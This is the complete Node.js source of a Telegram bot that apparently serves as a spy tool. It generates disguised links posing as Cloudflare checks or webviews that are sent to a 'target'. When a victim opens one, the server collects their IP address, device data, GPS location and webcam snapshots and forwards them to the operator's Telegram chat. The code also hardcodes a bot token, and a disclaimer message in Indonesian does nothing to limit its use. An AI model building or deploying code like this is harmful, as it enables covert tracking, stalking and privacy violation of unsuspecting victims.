require('dotenv').config();
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const telegramBotToken = '7158449956:AAG03-LP6P_u6TgbsTCPfCi56Qo5hoSlHRg';
const bot = new TelegramBot(telegramBotToken, { polling: true });
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

var hostURL="YOUR URL";
var use1pt=false;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/SpyBotID");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/SpyBotID");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Spy",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `⚠️ DISCLAIMER ⚠️\n\nDengan menggunakan Bot ini, berarti KAMU SUDAH SETUJU dengan poin-poin berikut:\n\n- Tidak menggunakan bot ini untuk melakukan tindakan pelanggaran.\n- Admin bot tidak bertanggung jawab atas segala bentuk tindakan pelanggaran yang user lakukan.\n- Segala bentuk pelanggaran akan diserahkan ke badan hukum.\n\n(kamu tidak akan bermasalah dengan poin-poin di atas jika memang kamu bukan orang yang berniat jahat)\n\nJika kamu setuju, silahkan klik /spy untuk membuat link\n\nGroup: @SpyBotID\nUser: ${msg.chat.first_name} \n\n=== /spy ===`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` ⚠️ DISCLAIMER ⚠️\n\nDengan menggunakan Bot ini, berarti KAMU SUDAH SETUJU dengan poin-poin berikut:\n\n- Tidak menggunakan bot ini untuk melakukan tindakan pelanggaran.\n- Admin bot tidak bertanggung jawab atas segala bentuk tindakan pelanggaran yang user lakukan.\n- Segala bentuk pelanggaran akan diserahkan ke badan hukum.\n\n(kamu tidak akan bermasalah dengan poin-poin di atas jika memang kamu bukan orang yang berniat jahat)\n\nJika kamu setuju, silahkan klik /spy untuk membuat link\n\nGroup: @SpyBotID\nUser: ${msg.chat.first_name} \n\n=== /spy ===
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Spy",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `Ok, the url was Spy.\nPlease copy the link below\nand send it to the target\nfor see their identity and location.\n\nURL: ${msg}\n\nCloudFlare: ${f}\n\nWebView: ${g}`,m);
}
else{

bot.sendMessage(cid, `Ok, the url was Spy.\nPlease copy the link below\nand send it to the target\nfor see their identity and location.\n\nURL: ${msg}\n\nCloudFlare: ${cUrl}\n\nWebView: ${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`Invalid URL. Please try another URL and make sure that is a valid URL`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;

var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if( uid != null && data != null){

 
if(data.indexOf(ip) < 0){
return res.send("ok");
}

data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
